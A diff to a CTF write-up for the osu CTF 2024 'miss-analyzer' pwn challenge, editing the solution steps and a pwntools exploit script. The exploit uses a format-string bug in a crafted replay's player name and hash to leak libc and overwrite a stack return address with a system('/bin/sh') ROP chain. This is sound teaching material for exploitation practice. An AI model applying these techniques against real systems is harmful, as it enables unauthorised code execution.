@@ -99,10 +99,11 @@ I thought I could use one-gadget to solve it (I haven't tried it yet), but I tri
 
 <font face="Cambria" size="40">**Solution:**  </font>
 
-**Step 1:** Create or find a replay of osu with a player name long enough to format.  
+**Step 1:** Create or find a replay of osu with a player name long enough to format. An osu replay file will have the following components analyzed and printed: hash, player name, missing point,... the most important is hash and player name.  
+![image](https://github.com/Code002016/PWN-CTF-2024/blob/main/Osu%20ctf/miss-analyzer/image/Screenshot%202024-03-05%20225153.png)  
 **Step 2**: The command provided by the program does not match the required program format, so I edited the command's output processing a bit. I have the entire definition in the getoutput() function.  
 **Step 3:** File processing: I copy the original to another file, and when editing the player name or hash, I must keep the correct length. Specifically, how do I define setup_payload().  
-**Step 4:** Set up libc leak payload and necessary addresses such as pop rdi ret, system, "/bin/sh",... if you don't know how to find libc version serch, here **https://libc.blukat.me/** is a website I often use.  
+**Step 4:** Set up libc leak payload and necessary addresses such as pop rdi ret, system, "/bin/sh",...I don't know why but the calculated offset is subtracted by 0x3000. if you don't know how to find libc version search, here **https://libc.blukat.me/** is a website I often use.  
 **Step 5:** Write the address that needs to be edited in "hash" and format it in printf(playername), the address that needs to be edited here I use the address containing __libc_start_call_main+128 on the stack, I overwrite it so that when the program outputs normally Normally it will call this address and execute.  
 **Step 6:** Waiting for the program to return to the getline, I randomly enter any bytes for the program to output and execute the call system("/bin/sh") that I passed in.  
 
@@ -115,14 +116,14 @@ import shutil
 shutil.copyfile('code016hiro1901 playing Rocket Start - Sushi Blast (Shmiklak) [Normal] (2024-03-02_20-14).osr', "temp")
 import subprocess
 
-e = context.binary = ELF('./analyzer', checksec=False)
-libc = ELF('libc.so.6')
+e = context.binary = ELF('./analyzer', checksec=True)
 
 # lib = e.libc
 # r= e.process()
 
 r= remote("chal.osugaming.lol", 7273)
-  
+lib = ELF('libc.so.6')
+
 def getoutput():
     output = subprocess.check_output(['xxd', '-p', '-c0', 'temp.txt'])
     output = output.decode('utf8')
@@ -157,9 +158,9 @@ info(f"overwrite: {hex(overwrite)}")
 
 retn = overwrite - 272
 
-system_libc = base_libc + 0x7fd5b5b26d70-0x7fd5b5ad3000
-binsh_libc = base_libc + 0x7fd5b5cae678-0x7fd5b5ad3000
-pop_rdi_ret = base_libc+0x00007f1bc0f2b3e5-0x7f1bc0efe000
+system_libc = base_libc + lib.sym.system+0x3000
+binsh_libc = base_libc + next(lib.search(b"/bin/sh"))+0x3000
+pop_rdi_ret = base_libc+ lib.sym.iconv+197+0x3000
 ret = pop_rdi_ret+1
 log.info("retn: %#x" %retn)
 
@@ -200,20 +201,13 @@ write_addr_1byte(binsh_libc, retn)
 retn+=8
 write_addr_1byte(system_libc, retn)
 
-# r.recv(5000)
-# setup_payload(b"a", b"a")
-# payload= getoutput()
-# gdb.attach(r, 
-    # f"""b*{retn}
-    # n
-    # """)
-    
-# pause()
+pause()
 r.sendlineafter(b"./analyzer):\n",b"3")
 
 r.interactive()
 
 # osu{1_h4te_c!!!!!!!!}
+
 ```
 
 <font face="Cambria" size="40">**Result:** </font>
